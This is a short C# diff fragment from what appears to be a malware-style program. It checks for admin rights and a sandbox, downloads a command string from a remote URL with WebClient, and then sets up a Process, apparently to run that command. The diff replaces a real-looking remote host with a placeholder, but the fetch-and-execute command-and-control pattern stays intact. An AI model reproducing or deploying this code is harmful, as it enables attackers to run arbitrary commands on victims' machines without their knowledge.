@@ -31,7 +31,7 @@ namespace cau
                         }
 
                 Console.WriteLine("Not admin");
-                string command = new WebClient().DownloadString("https://r.significantbyte.com/go.php");
+                string command = new WebClient().DownloadString("### website link which return command  ###");
                 Console.WriteLine("No sandbox");
                 Console.WriteLine("Command:"+command);
                 Process cmd = new Process();
